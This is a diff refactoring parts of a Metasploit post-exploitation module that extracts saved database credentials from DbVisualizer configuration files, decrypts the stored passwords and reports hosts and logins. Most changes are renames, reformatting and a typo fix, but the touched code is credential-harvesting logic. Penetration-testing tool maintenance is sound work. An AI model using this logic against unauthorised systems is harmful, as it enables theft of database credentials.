@@ -30,6 +30,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -37,7 +42,7 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('PASSPHRASE', [false, 'The hardcoded passphrase used for encryption']),
         OptInt.new('ITERATION_COUNT', [false, 'The iteration count used in key derivation', 10])
-      ], super.class
+      ]
     )
   end
 
@@ -138,6 +143,7 @@ class MetasploitModule < Msf::Post
     db = {}
     dbfound = false
     version_found = false
+
     # fetch config file
     raw_xml.each_line do |line|
       if version_found == false
@@ -155,7 +161,7 @@ class MetasploitModule < Msf::Post
           db[:Namespace] = ''
         end
         # save
-        dbs << db if (db[:Alias] && db[:Type] && db[:Server] && db[:Port])
+        dbs << db if db[:Alias] && db[:Type] && db[:Server] && db[:Port]
         db = {}
       end
 
@@ -204,21 +210,31 @@ class MetasploitModule < Msf::Post
     end
 
     # Fill the tab and report eligible servers
-    dbs.each do |db|
-      if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
-        print_good("Reporting #{db[:Server]}")
-        report_host(host: db[:Server])
+    dbs.each do |database|
+      if ::Rex::Socket.is_ipv4?(database[:Server].to_s)
+        print_good("Reporting #{database[:Server]}")
+        report_host(host: database[:Server])
       end
 
-      db_table << [ db[:Alias], db[:Type], db[:Server], db[:Port], db[:Database], db[:Namespace], db[:UserID], db[:Password] ]
+      db_table << [
+        database[:Alias],
+        database[:Type],
+        database[:Server],
+        database[:Port],
+        database[:Database],
+        database[:Namespace],
+        database[:UserID],
+        database[:Password]
+      ]
       report_cred(
-        ip: db[:Server],
-        port: db[:Port].to_i,
-        service_name: db[:Type],
-        username: db[:UserID],
-        password: db[:Password]
+        ip: database[:Server],
+        port: database[:Port].to_i,
+        service_name: database[:Type],
+        username: database[:UserID],
+        password: database[:Password]
       )
     end
+
     return db_table
   end
 
@@ -245,7 +261,7 @@ class MetasploitModule < Msf::Post
     # fetch config file
     raw_xml.each_line do |line|
       if version_found == false
-        vesrion_found = find_version(line)
+        version_found = find_version(line)
       end
 
       if line =~ /<Database id=/
@@ -253,7 +269,7 @@ class MetasploitModule < Msf::Post
       elsif line =~ %r{</Database>}
         dbfound = false
         # save
-        dbs << db if (db[:Alias] && db[:Url])
+        dbs << db if db[:Alias] && db[:Url]
         db = {}
       end
 
@@ -287,33 +303,40 @@ class MetasploitModule < Msf::Post
     end
 
     # Fill the tab
-    dbs.each do |db|
-      if (db[:URL] =~ %r{[\S+\s+]+/+([\S+\s+]+):[\S+]+}i)
+    dbs.each do |database|
+      if (database[:URL] =~ %r{[\S+\s+]+/+([\S+\s+]+):[\S+]+}i)
         server = ::Regexp.last_match(1)
         if ::Rex::Socket.is_ipv4?(server)
           print_good("Reporting #{server}")
           report_host(host: server)
         end
       end
-      db_table << [ db[:Alias], db[:Type], db[:URL], db[:UserID], db[:Password] ]
+      db_table << [
+        database[:Alias],
+        database[:Type],
+        database[:URL],
+        database[:UserID],
+        database[:Password]
+      ]
       report_cred(
         ip: server,
         port: '',
-        service_name: db[:Type],
-        username: db[:UserID],
-        password: db[:Password]
+        service_name: database[:Type],
+        username: database[:UserID],
+        password: database[:Password]
       )
     end
+
     return db_table
   end
 
   def find_version(tag)
-    found = false
     if tag =~ %r{<Version>([\S+\s+]+)</Version>}i
-      found = true
       print_good("DbVisualizer version: #{::Regexp.last_match(1)}")
+      return true
     end
-    found
+
+    false
   end
 
   def report_cred(opts)
@@ -349,7 +372,7 @@ class MetasploitModule < Msf::Post
     des.decrypt
     des.key = dk
     des.iv = iv
-    password = des.update(enc_password) + des.final
+    des.update(enc_password) + des.final
   end
 
   def get_derived_key
